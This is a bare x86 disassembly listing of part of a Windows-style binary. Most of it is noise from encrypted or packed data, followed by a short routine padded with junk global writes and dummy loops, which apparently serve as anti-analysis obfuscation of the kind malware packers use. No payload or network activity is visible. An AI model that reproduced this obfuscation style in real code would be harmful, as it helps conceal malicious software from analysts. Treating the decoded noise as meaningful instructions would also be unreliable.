  40314f:	cwde   
  403150:	push   ds
  403151:	stos   DWORD PTR es:[edi],eax
  403152:	xchg   cl,ch
  403154:	imul   eax,DWORD PTR [ebx+0x3757f8b3],0x74df8c18
  40315e:	mov    eax,0x69cc4ccb
  403163:	loope  0x40317d
  403165:	data16 mov dh,ah
  403168:	mov    BYTE PTR [ebp+0x4e0e34e2],bh
  40316e:	das    
  40316f:	es dec eax
  403171:	lods   al,BYTE PTR ds:[esi]
  403172:	leave  
  403173:	fild   QWORD PTR [ecx-0x78]
  403176:	jmp    0x403112
  403178:	pop    ebp
  403179:	sbb    al,0x71
  40317b:	mov    ebp,ebp
  40317d:	inc    edi
  40317e:	cmp    eax,0xd456165c
  403183:	loope  0x403128
  403185:	lods   eax,DWORD PTR ds:[esi]
  403186:	and    esi,ecx
  403188:	xchg   ebx,eax
  403189:	mov    edi,0xab1a2732
  40318e:	lds    edi,FWORD PTR ds:0x6f85086d
  403194:	cs scas eax,DWORD PTR es:[edi]
  403196:	fs imul ecx,DWORD PTR fs:[edx+0x21],0x48357580
  40319f:	les    edx,FWORD PTR [edi+0x45ae2a26]
  4031a5:	aaa    
  4031a6:	pop    es
  4031a7:	push   edx
  4031a8:	push   ds
  4031a9:	enter  0xd648,0xea
  4031ad:	aaa    
  4031ae:	xlat   BYTE PTR ds:[ebx]
  4031af:	mov    ah,0xde
  4031b1:	and    al,0x33
  4031b3:	fisub  DWORD PTR [eax]
  4031b5:	cmp    cl,BYTE PTR [esi+eiz*8+0x7d]
  4031b9:	shl    dl,cl
  4031bb:	dec    esi
  4031bc:	jo     0x4031b1
  4031be:	mov    DWORD PTR [edx+0x62017157],0x9076bf59
  4031c8:	imul   ecx,DWORD PTR [ebx+eax*4],0x1343da7
  4031cf:	cmp    al,0xc2
  4031d1:	(bad)  
  4031d2:	xchg   ebp,eax
  4031d3:	fild   QWORD PTR ds:0x3808606f
  4031d9:	pop    ds
  4031da:	in     al,dx
  4031db:	jg     0x40318b
  4031dd:	pop    ds
  4031de:	mov    dh,0x61
  4031e0:	call   0x7210:0x82cf3d48
  4031e7:	ret    
  4031e8:	lods   al,BYTE PTR ds:[esi]
  4031e9:	adc    ch,dh
  4031eb:	call   0xc04c:0x7c635f11
  4031f2:	dec    esp
  4031f3:	pop    ss
  4031f4:	sub    al,0xb0
  4031f6:	imul   DWORD PTR [ebx]
  4031f8:	(bad)  [esi+edi*8-0x2619e880]
  4031ff:	mov    bh,0xe9
  403201:	dec    ecx
  403202:	ds fmul st,st(7)
  403205:	lahf   
  403206:	jecxz  0x403216
  403208:	cwde   
  403209:	adc    BYTE PTR [edx-0x1ff2ee63],ch
  40320f:	sbb    eax,0xb1cbb305
  403214:	jl     0x4031e8
  403216:	pop    ss
  403217:	jo     0x40328b
  403219:	(bad)  
  40321a:	dec    ebp
  40321b:	cmp    ch,BYTE PTR [esi+eax*1+0x16]
  40321f:	lods   eax,DWORD PTR ds:[esi]
  403220:	dec    eax
  403221:	xor    DWORD PTR [ecx-0x18],eax
  403224:	js     0x4031b4
  403226:	mov    dl,0xf4
  403228:	add    eax,0xace72fad
  40322d:	mov    ch,0xff
  40322f:	ja     0x4031d8
  403231:	pop    edx
  403232:	and    al,0x1d
  403234:	xor    al,0x8b
  403236:	pop    edx
  403237:	jno    0x403217
  403239:	fs ss cdq 
  40323c:	jp     0x403275
  40323e:	inc    edi
  40323f:	fidiv  WORD PTR [esi]
  403241:	ret    
  403242:	or     ebx,esi
  403244:	cli    
  403245:	mov    al,bl
  403247:	cdq    
  403248:	popa   
  403249:	xchg   edx,eax
  40324a:	mov    al,0xa0
  40324c:	loop   0x4031da
  40324e:	rcr    DWORD PTR [ecx],1
  403250:	sub    esi,DWORD PTR [esi-0x6d]
  403253:	sub    dl,BYTE PTR [ecx]
  403255:	pop    ds
  403256:	and    esi,DWORD PTR [esi+0x46]
  403259:	adc    edx,0x69
  40325c:	leave  
  40325d:	and    cl,BYTE PTR [ebx+ecx*2]
  403260:	pop    ebx
  403261:	dec    eax
  403262:	in     al,0xc9
  403264:	mov    dl,0xb1
  403266:	push   edi
  403267:	mov    ds:0x9955a0f1,al
  40326c:	jno    0x403231
  40326e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40326f:	adc    DWORD PTR [eax],eax
  403271:	or     ebp,DWORD PTR [edi]
  403273:	and    al,0x8f
  403275:	jne    0x4032d2
  403277:	dec    ecx
  403278:	xor    DWORD PTR [ebx-0x55],0xffffffb8
  40327c:	adc    DWORD PTR [edi-0x12c58868],esi
  403282:	std    
  403283:	ins    DWORD PTR es:[edi],dx
  403284:	mov    edx,0x633f5640
  403289:	hlt    
  40328a:	pop    ss
  40328b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40328d:	rcr    BYTE PTR [edx],cl
  40328f:	and    al,0xe8
  403291:	cs nop
  403293:	mov    ebp,0x1aed4d3f
  403298:	fidivr DWORD PTR ds:0xf111e0d6
  40329e:	mov    edx,0x6d953cc1
  4032a3:	mov    ch,0xfa
  4032a5:	xor    al,0x12
  4032a7:	rol    DWORD PTR [esi+edx*1+0x427e183a],1
  4032ae:	mov    eax,0xb74338c3
  4032b3:	ins    BYTE PTR es:[edi],dx
  4032b4:	push   ds
  4032b5:	jmp    0x1b9d:0x96c054d
  4032bc:	xor    ah,BYTE PTR [ecx+edx*2-0x5f8b1514]
  4032c3:	jge    0x403255
  4032c5:	fucom  st(5)
  4032c7:	adc    DWORD PTR [edx+0xa],edx
  4032ca:	sbb    ah,BYTE PTR [eax-0x1fb26998]
  4032d0:	icebp  
  4032d1:	xor    edi,DWORD PTR [edi]
  4032d3:	adc    al,0x9a
  4032d5:	and    BYTE PTR [ecx],0x5d
  4032d8:	cld    
  4032d9:	adc    al,0xdd
  4032db:	or     eax,0xcef0e3c9
  4032e0:	lea    edx,[esi-0x59d3c1d1]
  4032e6:	iret   
  4032e7:	rcl    DWORD PTR [ebp+0x1caf4e13],1
  4032ed:	dec    esp
  4032ee:	and    DWORD PTR [edx-0x4a],eax
  4032f1:	in     al,dx
  4032f2:	push   cs
  4032f3:	mov    edx,0x744abf0
  4032f8:	dec    ebp
  4032f9:	in     eax,0x61
  4032fb:	cmp    BYTE PTR [esi+0x23a8ebe4],cl
  403301:	push   edx
  403302:	fnsave [ebp+0x66]
  403305:	push   es
  403306:	icebp  
  403307:	jno    0x40336e
  403309:	icebp  
  40330a:	pop    eax
  40330b:	scas   eax,DWORD PTR es:[edi]
  40330c:	xchg   ebx,eax
  40330d:	scas   al,BYTE PTR es:[edi]
  40330e:	push   0x2687d934
  403313:	lods   al,BYTE PTR ds:[esi]
  403314:	enter  0x49a3,0x1
  403318:	out    0x1b,al
  40331a:	mov    dl,0x36
  40331c:	aaa    
  40331d:	or     esp,ecx
  40331f:	dec    ebx
  403320:	add    eax,0x54375c3e
  403325:	sahf   
  403326:	and    al,0xa8
  403328:	mov    bh,0x26
  40332a:	cmp    esp,eax
  40332c:	js     0x40331f
  40332e:	int3   
  40332f:	hlt    
  403330:	xchg   BYTE PTR [edx],ah
  403332:	xor    eax,0x83a8c580
  403337:	ror    BYTE PTR ds:0xe7eef3bc,1
  40333d:	ins    BYTE PTR es:[edi],dx
  40333e:	jmp    FWORD PTR [esi]
  403340:	popa   
  403341:	jge    0x4033b0
  403343:	and    DWORD PTR [ecx],0x8fcdec21
  403349:	sbb    bh,BYTE PTR ds:0xef042b78
  40334f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403350:	mov    cl,0x4d
  403352:	mov    bl,0xd8
  403354:	jecxz  0x4033d1
  403356:	ja     0x403315
  403358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403359:	test   eax,0x6b784893
  40335e:	mov    ch,0x6d
  403360:	imul   ebp,eax,0xebc3c167
  403366:	jbe    0x403375
  403368:	mov    dh,0x8a
  40336a:	pop    ebx
  40336b:	loope  0x40331c
  40336d:	data16 sbb al,ch
  403370:	and    al,0x93
  403372:	(bad)  
  403373:	cmp    ebx,esp
  403375:	dec    esp
  403376:	push   eax
  403377:	adc    ebp,ebp
  403379:	mov    ebx,0x74235eaf
  40337e:	sub    ecx,DWORD PTR ds:0x3b06351c
  403384:	or     eax,0x21a32dd
  403389:	retf   
  40338a:	push   ss
  40338b:	jno    0x403373
  40338d:	xor    DWORD PTR [esi+0x18],0xfffffffd
  403391:	mov    dl,0xaf
  403393:	add    dx,WORD PTR [edx-0x43]
  403397:	arpl   ax,ax
  403399:	push   edi
  40339a:	cmp    al,bh
  40339c:	in     al,0x8d
  40339e:	xchg   DWORD PTR [edi],esi
  4033a0:	leave  
  4033a1:	inc    eax
  4033a2:	or     DWORD PTR [ecx+0x1b445820],ebx
  4033a8:	add    cl,bh
  4033aa:	out    dx,al
  4033ab:	out    dx,al
  4033ac:	jmp    0xa2642a39
  4033b1:	jnp    0x40336f
  4033b3:	push   es
  4033b4:	cs dec ebp
  4033b6:	jno    0x4033a4
  4033b8:	ret    0x9772
  4033bb:	imul   ecx,DWORD PTR [edx],0x51
  4033be:	adc    edx,ebp
  4033c0:	in     al,dx
  4033c1:	xchg   eax,esp
  4033c3:	push   esp
  4033c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033c5:	cli    
  4033c6:	popa   
  4033c7:	out    dx,al
  4033c8:	mov    WORD PTR [ebp+0x32],cs
  4033cb:	jge    0x403417
  4033cd:	add    bl,cl
  4033cf:	mov    eax,0xeb1fb21c
  4033d4:	mov    al,ds:0xeb5e8fbd
  4033d9:	mov    esi,0xb745af2e
  4033de:	(bad)  
  4033df:	rol    DWORD PTR [esi+0x13a52709],0x7d
  4033e6:	xchg   ebx,eax
  4033e7:	dec    ecx
  4033e8:	sbb    ebp,DWORD PTR [esi+0x6b7a5988]
  4033ee:	pop    edx
  4033ef:	stos   DWORD PTR es:[edi],eax
  4033f0:	in     eax,0x11
  4033f2:	out    dx,eax
  4033f3:	push   0x43
  4033f5:	inc    edx
  4033f6:	pop    ss
  4033f7:	jle    0x4033d6
  4033f9:	jae    0x40345f
  4033fb:	daa    
  4033fc:	inc    ebx
  4033fd:	add    esp,DWORD PTR [edi+0x11d03b52]
  403403:	lahf   
  403404:	scas   al,BYTE PTR es:[edi]
  403405:	out    0x12,al
  403407:	lea    eax,[eax+0x26a15008]
  40340d:	pusha  
  40340e:	mov    ch,0x7f
  403410:	fisttp WORD PTR [ebx]
  403412:	enter  0xaf5,0x2d
  403416:	mov    edi,0x58c8f5af
  40341b:	loope  0x403453
  40341d:	imul   ebx,DWORD PTR [esi],0x20
  403420:	pop    edx
  403421:	jle    0x40345f
  403423:	and    BYTE PTR [esi-0x3c4db76a],ah
  403429:	xchg   DWORD PTR [ecx-0x535bed66],esi
  40342f:	jecxz  0x403432
  403431:	dec    eax
  403432:	xchg   edi,ebp
  403434:	mov    esp,0x4630ff3d
  403439:	cmp    eax,DWORD PTR [eax+0x3102fe79]
  40343f:	mov    cl,0xdb
  403441:	mov    al,ds:0x35c44831
  403446:	aaa    
  403447:	mov    DWORD PTR [edx],ecx
  403449:	js     0x403445
  40344b:	jge    0x4034b3
  40344d:	scas   al,BYTE PTR es:[edi]
  40344e:	imul   esi,DWORD PTR gs:[edx],0x647edde3
  403455:	sahf   
  403456:	loope  0x4033fb
  403458:	jmp    0xe889ebd2
  40345d:	lods   al,BYTE PTR ds:[esi]
  40345e:	lods   al,BYTE PTR ds:[esi]
  40345f:	fldenv [ecx+0x75]
  403462:	mov    edi,0x5af945a9
  403467:	or     bl,BYTE PTR [edx]
  403469:	in     al,dx
  40346a:	mov    ebx,0xcff56260
  40346f:	xchg   edi,eax
  403470:	or     ebx,edi
  403472:	fsubr  QWORD PTR [ebx+eax*2]
  403475:	ins    BYTE PTR es:[edi],dx
  403476:	lds    ecx,FWORD PTR [ecx-0x4b0bb5bd]
  40347c:	pop    edi
  40347d:	idiv   DWORD PTR [ebp+ecx*2+0x70]
  403481:	jnp    0x403420
  403483:	fcomp  QWORD PTR ds:0x92f5d333
  403489:	fist   DWORD PTR [eax+edi*8+0x2c]
  40348d:	pop    es
  40348e:	stos   BYTE PTR es:[edi],al
  40348f:	cli    
  403490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403491:	add    esi,esp
  403493:	lea    edx,[ebx-0x52]
  403496:	or     BYTE PTR [ebx],bl
  403498:	xchg   ebx,eax
  403499:	mov    ds:0x2b80a653,eax
  40349e:	push   ds
  40349f:	ret    0x5ab1
  4034a2:	pop    esp
  4034a3:	jmp    0x8c7a:0xfc15fa9a
  4034aa:	fisubr WORD PTR ds:0x60fb0812
  4034b0:	call   0x9f651173
  4034b5:	xlat   BYTE PTR ds:[ebx]
  4034b6:	test   DWORD PTR ss:[esi-0x44535ab8],esi
  4034bd:	mov    ebp,0xe97e0f8c
  4034c2:	cs and ch,bh
  4034c5:	arpl   WORD PTR [eax],dx
  4034c7:	xchg   ecx,eax
  4034c8:	push   ebx
  4034c9:	pop    ss
  4034ca:	sub    DWORD PTR [ebx-0x1a85534e],0xffffffa6
  4034d1:	pop    ds
  4034d2:	pop    ebp
  4034d3:	aad    0x37
  4034d5:	movq   mm1,QWORD PTR [edx]
  4034d8:	(bad)  
  4034d9:	xchg   esp,eax
  4034da:	pop    ds
  4034db:	leave  
  4034dc:	fmul   DWORD PTR [edx]
  4034de:	fst    DWORD PTR [eax]
  4034e0:	mov    fs,WORD PTR ds:0x41a69090
  4034e6:	or     dl,BYTE PTR [ebp-0x36]
  4034e9:	(bad)  
  4034ea:	inc    edi
  4034eb:	and    ecx,DWORD PTR [eax+0x1f]
  4034ee:	fnstsw WORD PTR [eax+0x68]
  4034f1:	mov    eax,0x8167d420
  4034f6:	fidivr WORD PTR [ebp-0x5c]
  4034f9:	stos   BYTE PTR es:[edi],al
  4034fa:	in     eax,dx
  4034fb:	int3   
  4034fc:	nop
  4034fd:	test   BYTE PTR [ecx-0x19],cl
  403500:	frstor [ecx+esi*4]
  403503:	push   ecx
  403504:	jecxz  0x4034d3
  403506:	push   edi
  403507:	pop    esi
  403508:	add    eax,0x81d3686d
  40350d:	jo     0x403574
  40350f:	mov    ebx,0x3d692ab6
  403514:	popa   
  403515:	repnz aas 
  403517:	mov    ebx,0x7d978b9a
  40351c:	cmp    eax,0x5c2ee035
  403521:	bnd jo 0x4034f8
  403524:	shr    DWORD PTR [ebx-0x4fe9a842],0xf4
  40352b:	mov    esi,0x2121dbed
  403530:	jbe    0x403507
  403532:	and    ch,BYTE PTR [eax]
  403534:	pop    edx
  403535:	mov    ds:0xa81bae89,al
  40353a:	push   eax
  40353b:	scas   al,BYTE PTR es:[edi]
  40353c:	fcmovne st,st(2)
  40353e:	and    eax,0x9b9f7171
  403543:	stos   BYTE PTR es:[edi],al
  403544:	retf   
  403545:	add    dl,BYTE PTR [ebp-0x3]
  403548:	scas   al,BYTE PTR es:[edi]
  403549:	fwait
  40354a:	int3   
  40354b:	les    ebx,FWORD PTR cs:[esi+0x61261ff4]
  403552:	xor    eax,0x706fe412
  403557:	jmp    0x3424:0x4bee5153
  40355e:	or     al,0x5d
  403560:	rcl    DWORD PTR [ecx+0x55],1
  403563:	push   ds
  403564:	push   ds
  403565:	mov    al,ds:0x60aeca0
  40356a:	cs mov esp,0xa2097e1f
  403570:	mov    eax,0x76d0c2ce
  403575:	sbb    al,0x9b
  403577:	pop    edi
  403578:	add    dl,BYTE PTR [ebp+0x6d630af1]
  40357e:	stos   BYTE PTR es:[edi],al
  40357f:	and    BYTE PTR [esi+0x27],0xba
  403583:	jne    0x403511
  403585:	popa   
  403586:	ret    
  403587:	shl    BYTE PTR [edx],1
  403589:	pop    ebp
  40358a:	mov    ebp,0x4847899f
  40358f:	push   es
  403590:	add    dh,dh
  403592:	int3   
  403593:	add    esp,DWORD PTR [eax+eiz*8-0x5d]
  403597:	sbb    bh,dl
  403599:	inc    edx
  40359a:	mov    ah,0x8e
  40359c:	fstp   DWORD PTR [esi]
  40359e:	mov    ?,WORD PTR [eax+0x2b]
  4035a1:	jbe    0x4035de
  4035a3:	int    0x6b
  4035a5:	xchg   ecx,eax
  4035a6:	mov    edx,DWORD PTR [edx-0x2]
  4035a9:	seto   BYTE PTR [esp+eiz*8-0xacdadda]
  4035b1:	repnz imul esi,DWORD PTR [esi+0x758e0f23],0xb29ac4ae
  4035bc:	add    bh,bh
  4035be:	test   eax,0x3b2adc1
  4035c3:	fwait
  4035c4:	xor    DWORD PTR [esi+0x6efd6203],0xfffffff9
  4035cb:	imul   edx,DWORD PTR [ebp+0x14],0x1a
  4035cf:	ds mov dl,0x2
  4035d2:	js     0x4035e2
  4035d4:	pushf  
  4035d5:	in     al,dx
  4035d6:	dec    ecx
  4035d7:	push   ebp
  4035d8:	jl     0x4035c3
  4035da:	sub    al,0xba
  4035dc:	out    0x15,al
  4035de:	(bad)  [ecx+0x7f]
  4035e1:	jae    0x403640
  4035e3:	or     al,0x12
  4035e5:	fcmovne st,st(5)
  4035e7:	es jns 0x4035d3
  4035ea:	rcl    DWORD PTR [edx],1
  4035ec:	dec    edx
  4035ed:	push   ecx
  4035ee:	xor    eax,0xfc7275aa
  4035f3:	aam    0x5d
  4035f5:	ss jnp 0x4035be
  4035f8:	xlat   BYTE PTR ds:[ebx]
  4035f9:	jnp    0x403607
  4035fb:	inc    edi
  4035fc:	loopne 0x4035f9
  4035fe:	push   ecx
  4035ff:	(bad)  
  403600:	ins    BYTE PTR es:[edi],dx
  403601:	cmp    esi,DWORD PTR [eax-0x4b51ba6e]
  403607:	pop    ebp
  403608:	(bad)  
  403609:	push   0xa5b35f45
  40360e:	jne    0x40364e
  403610:	test   al,0x82
  403612:	add    al,0xa1
  403614:	out    dx,al
  403615:	scas   al,BYTE PTR es:[edi]
  403616:	sbb    DWORD PTR [ecx+0x32],edx
  403619:	cs clc 
  40361b:	int3   
  40361c:	add    dh,dh
  40361e:	and    BYTE PTR [edi-0x21dafccb],dh
  403624:	pushf  
  403625:	fisttp WORD PTR [ecx-0x28]
  403628:	sub    eax,0xe4590693
  40362d:	pop    esp
  40362e:	rol    BYTE PTR [edi-0x6635ce0f],1
  403634:	jp     0x403641
  403636:	shr    ebp,1
  403638:	imul   dh
  40363a:	pusha  
  40363b:	push   ebx
  40363c:	mov    ch,0x96
  40363e:	mov    ah,0x87
  403640:	daa    
  403641:	sub    BYTE PTR [esi+0x27998414],dl
  403647:	das    
  403648:	sub    edi,esp
  40364a:	in     al,0x1d
  40364c:	xor    DWORD PTR [ecx+0x5b0d90a3],esp
  403652:	push   ds
  403653:	push   0x54575665
  403658:	fld    TBYTE PTR [edx]
  40365a:	pop    es
  40365b:	dec    edx
  40365c:	cmp    DWORD PTR [edi+0xd55e3db],edi
  403662:	fs jb  0x4035e9
  403665:	jl     0x403640
  403667:	sub    DWORD PTR [ecx],esp
  403669:	shl    ebp,1
  40366b:	add    eax,0x5583f790
  403670:	fnstenv [esi]
  403672:	lea    eax,ds:0x18ecc2d8
  403678:	sub    eax,0x646ada7
  40367d:	loop   0x403684
  40367f:	mov    ecx,0x85a2c7e
  403684:	xchg   edi,eax
  403685:	in     al,0xd9
  403687:	daa    
  403688:	and    al,BYTE PTR [ecx-0x9]
  40368b:	cmp    eax,DWORD PTR [ecx-0x5f]
  40368e:	test   eax,0x527d5096
  403693:	int3   
  403694:	call   0xad398c18
  403699:	and    ebp,DWORD PTR [edx+0x45c7096b]
  40369f:	inc    edi
  4036a0:	jae    0x4036ec
  4036a2:	adc    ecx,DWORD PTR [ecx+ebp*8-0x21]
  4036a6:	jo     0x40366b
  4036a8:	ss iret 
  4036aa:	push   edx
  4036ab:	xchg   ebx,eax
  4036ac:	test   eax,esp
  4036ae:	lods   al,BYTE PTR ds:[esi]
  4036af:	jns    0x4036fb
  4036b1:	adc    ch,BYTE PTR [edx]
  4036b3:	jno    0x4036e5
  4036b5:	push   edi
  4036b6:	jge    0x4036b8
  4036b8:	mov    ecx,DWORD PTR [edi-0x95156b4]
  4036be:	aas    
  4036bf:	xchg   ebp,eax
  4036c0:	dec    ebp
  4036c1:	mov    eax,0x690e3118
  4036c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036c7:	outs   dx,BYTE PTR ds:[esi]
  4036c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036c9:	test   eax,0x89d1377c
  4036ce:	xor    eax,0x3076a069
  4036d3:	and    edi,DWORD PTR [ebp+0x3d7a1732]
  4036d9:	mov    esp,0x900a67fc
  4036de:	push   cs
  4036df:	cmp    DWORD PTR [edx+0x12322724],ebp
  4036e5:	out    0xd2,al
  4036e7:	inc    edx
  4036e8:	mov    bl,0xba
  4036ea:	jae    0x4036d1
  4036ec:	fidiv  WORD PTR [edx+ebp*8-0x1043195a]
  4036f3:	jnp    0x403675
  4036f5:	(bad)  
  4036f6:	push   edx
  4036f7:	retf   
  4036f8:	pop    esi
  4036f9:	outs   dx,DWORD PTR ds:[esi]
  4036fa:	js     0x4036f6
  4036fc:	mov    BYTE PTR [ebp-0x7f],ch
  4036ff:	cwde   
  403700:	test   DWORD PTR [ebp-0x72088945],eax
  403706:	stos   DWORD PTR es:[edi],eax
  403707:	sbb    BYTE PTR [edi+0x10cd6341],al
  40370d:	and    al,0xec
  40370f:	loope  0x40370d
  403711:	jno    0x40375d
  403713:	push   esp
  403714:	in     eax,dx
  403715:	out    dx,al
  403716:	outs   dx,BYTE PTR ds:[esi]
  403717:	xchg   esi,eax
  403718:	fistp  WORD PTR [ecx-0x2c]
  40371b:	jbe    0x40372b
  40371d:	jnp    0x403719
  40371f:	mov    ch,0xfb
  403721:	ficom  DWORD PTR [ebp-0x16]
  403724:	mov    WORD PTR [eax],es
  403726:	or     BYTE PTR [ebx-0x1b9b8a0],al
  40372c:	jge    0x403765
  40372e:	xchg   edx,eax
  40372f:	pop    esp
  403730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403731:	xor    DWORD PTR [ecx+0x30240f16],0x78
  403738:	xor    ch,bh
  40373a:	sub    BYTE PTR [edi+edi*1],dl
  40373d:	popa   
  40373e:	sbb    al,0xce
  403740:	sbb    DWORD PTR [ebx-0x7e],0x252dd284
  403747:	popf   
  403748:	dec    edx
  403749:	mov    ds:0x2d648447,eax
  40374e:	test   eax,0x22f66177
  403753:	or     BYTE PTR [eax-0x60e5a650],ah
  403759:	xchg   esi,eax
  40375a:	mov    ds:0x94c84c21,eax
  40375f:	ret    0xa397
  403762:	test   al,0xa1
  403764:	stos   DWORD PTR es:[edi],eax
  403765:	jbe    0x403702
  403767:	popf   
  403768:	arpl   si,di
  40376a:	fucompp 
  40376c:	sub    DWORD PTR [eax-0x54d6bce4],esp
  403772:	jmp    0x403722
  403774:	mov    cl,0x87
  403776:	fisubr WORD PTR [ebp+0x3e]
  403779:	shl    DWORD PTR [ebp+edi*2+0x29],cl
  40377d:	add    eax,0xe7c40d05
  403782:	aas    
  403783:	ret    
  403784:	add    edx,DWORD PTR es:[edx+0x10]
  403788:	jns    0x40375b
  40378a:	mov    esi,cr2
  40378d:	dec    eax
  40378e:	(bad)  
  403790:	xchg   esi,eax
  403791:	call   FWORD PTR [esi+0x7a37d3e2]
  403797:	std    
  403798:	add    esp,0x9886f22c
  40379e:	push   eax
  40379f:	cs mov edx,0x62aa4308
  4037a5:	jns    0x403821
  4037a7:	imul   edi,DWORD PTR [edi-0x6ff97ee1],0x5d03ff9e
  4037b1:	idiv   BYTE PTR [esp+edx*1+0x19a42154]
  4037b8:	add    dh,ah
  4037ba:	je     0x403833
  4037bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037bd:	sbb    eax,0xd27d41ee
  4037c2:	or     bh,cl
  4037c4:	inc    ebx
  4037c5:	ss push ss
  4037c7:	test   eax,0xd25c2fb1
  4037cc:	fcomi  st,st(2)
  4037ce:	addr16 cmp al,0xa0
  4037d1:	add    DWORD PTR [ebx+0x6d2dcbe1],0x70
  4037d8:	mov    edx,DWORD PTR [esi]
  4037da:	xlat   BYTE PTR ds:[ebx]
  4037db:	sti    
  4037dc:	or     al,bh
  4037de:	or     dh,dl
  4037e0:	mov    esi,0x7fd8a997
  4037e5:	nop
  4037e6:	data16 mov ah,0xeb
  4037e9:	mov    al,0x4a
  4037eb:	lods   eax,DWORD PTR ds:[esi]
  4037ec:	loope  0x40378a
  4037ee:	arpl   WORD PTR [ebp-0x77],sp
  4037f1:	mov    ebp,0x3ebdeec1
  4037f6:	adc    eax,eax
  4037f8:	rcr    BYTE PTR [ebx-0x11],0xd8
  4037fc:	pop    eax
  4037fd:	mov    es,WORD PTR [edi+0x3ade6348]
  403803:	xchg   ecx,eax
  403804:	clc    
  403805:	xchg   edx,eax
  403806:	shr    BYTE PTR [ecx-0xc7e0660],0xd2
  40380d:	enter  0x9bba,0x91
  403811:	add    al,0x40
  403813:	in     eax,0x4c
  403815:	mov    eax,DWORD PTR [ebp-0x10]
  403818:	mov    ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42aa0b
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42aa0f
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
